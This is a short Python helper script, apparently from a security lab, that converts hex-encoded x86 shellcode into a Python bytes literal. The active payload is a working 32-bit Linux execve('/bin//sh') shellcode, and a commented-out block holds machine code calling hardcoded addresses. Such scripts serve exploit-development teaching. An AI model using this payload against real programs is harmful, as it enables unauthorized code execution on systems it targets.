#!/usr/bin/python3
'''
ori_sh = """
31c031c9b107b005
5150bbf1625556ffd350bb5d635556ffd3
"""
'''
ori_sh = """
31c050682f2f7368
682f62696e89e3505389e131d231c0b00bcd80
"""
sh = ori_sh.replace("\n", "")

length  = int(len(sh)/2)
print("Length of the shellcode: {}".format(length))
s = 'shellcode= (\n' + '   "'
for i in range(length):
    s += "\\x" + sh[2*i] + sh[2*i+1]
    if i > 0 and i % 16 == 15: 
       s += '"\n' + '   "'
s += '"\n' + ").encode('latin-1')"
print(s)



